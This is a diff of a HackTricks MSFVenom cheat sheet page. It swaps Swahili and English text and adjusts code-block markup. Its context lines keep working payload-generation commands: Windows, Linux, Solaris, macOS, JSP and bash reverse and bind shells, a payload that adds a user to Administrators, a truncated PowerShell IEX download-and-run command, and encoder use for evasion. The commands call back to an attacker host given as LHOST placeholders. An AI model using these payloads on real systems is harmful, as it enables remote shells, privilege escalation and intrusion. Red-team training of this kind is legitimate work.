@@ -1,49 +1,49 @@
 # MSFVenom - CheatSheet
 
 {% hint style="success" %}
-Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
-Jiunge na [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server ili kuwasiliana na hackers wenye uzoefu na hunters wa bug bounty!
+Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
 
-**Uelewa wa Hacking**\
-Shiriki na maudhui yanayoangazia msisimko na changamoto za hacking
+**Hacking Insights**\
+Shiriki maudhui yanayochunguza msisimko na changamoto za hacking
 
-**Habari za Hack kwa Wakati Halisi**\
-Baki na habari za hivi punde katika ulimwengu wa hacking kupitia habari na uelewa wa wakati halisi
+**Real-Time Hack News**\
+Endelea kuwa na habari za hivi punde katika ulimwengu wa hacking kupitia habari na maarifa ya wakati halisi
 
-**Matangazo ya Hivi Punde**\
-Baki na taarifa kuhusu bug bounties mpya zinazozinduliwa na masasisho muhimu ya jukwaa
+**Latest Announcements**\
+Baki na habari kuhusu bug bounties mpya zinazozinduliwa na masasisho muhimu ya jukwaa
 
-**Jiunge nasi kwenye** [**Discord**](https://discord.com/invite/N3FrSbmwdy) na uanze kushirikiana na hackers bora leo!
+**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
 
 ***
 
-## Msingi msfvenom
+## Basic msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
 Mtu anaweza pia kutumia `-a` kubaini usanifu au `--platform`
 
-## Orodha
+## Listing
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-## Paramu za kawaida wakati wa kuunda shellcode
+## Parametria za kawaida wakati wa kuunda shellcode
 ```bash
 -b "\x00\x0a\x0d"
 -f c
@@ -83,7 +83,7 @@ msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
 ```
-### **Teua Amri**
+### **Tekeleza Amri**
 
 {% code overflow="wrap" %}
 ```bash
@@ -91,8 +91,6 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Obj
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
 ```
 ### Encoder
-
-{% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
@@ -123,6 +121,8 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
 ```bash
 msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
 ```
+{% endcode %}
+
 ### SunOS (Solaris)
 
 {% code overflow="wrap" %}
@@ -139,7 +139,11 @@ msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTAC
 ```bash
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
 ```
+{% endcode %}
+
 ### **Bind Shell**
+
+{% code overflow="wrap" %}
 ```bash
 msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
 ```
@@ -177,9 +181,9 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f r
 ```
 {% endcode %}
 
-### WAZI
+### WAZO
 
-#### Reverse Shell
+#### Shell ya Kurudi
 
 {% code overflow="wrap" %}
 ```bash
@@ -209,14 +213,14 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
-Jiunge na [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server ili kuwasiliana na hackers wenye uzoefu na wawindaji wa bug bounty!
+Jiunge na [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server kuwasiliana na hackers wenye uzoefu na wawindaji wa bug bounty!
 
 **Uelewa wa Udukuzi**\
 Shiriki na maudhui yanayochunguza msisimko na changamoto za udukuzi
 
-**Habari za Udukuzi za Wakati Halisi**\
+**Habari za Udukuzi wa Wakati Halisi**\
 Baki na habari za hivi punde katika ulimwengu wa udukuzi kupitia habari na uelewa wa wakati halisi
 
 **Matangazo ya Hivi Punde**\
@@ -225,8 +229,8 @@ Baki na taarifa kuhusu bug bounties mpya zinazozinduliwa na masasisho muhimu ya 
 **Jiunge nasi kwenye** [**Discord**](https://discord.com/invite/N3FrSbmwdy) na anza kushirikiana na hackers bora leo!
 
 {% hint style="success" %}
-Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Jifunze na fanya mazoezi ya Udukuzi wa AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na fanya mazoezi ya Udukuzi wa GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
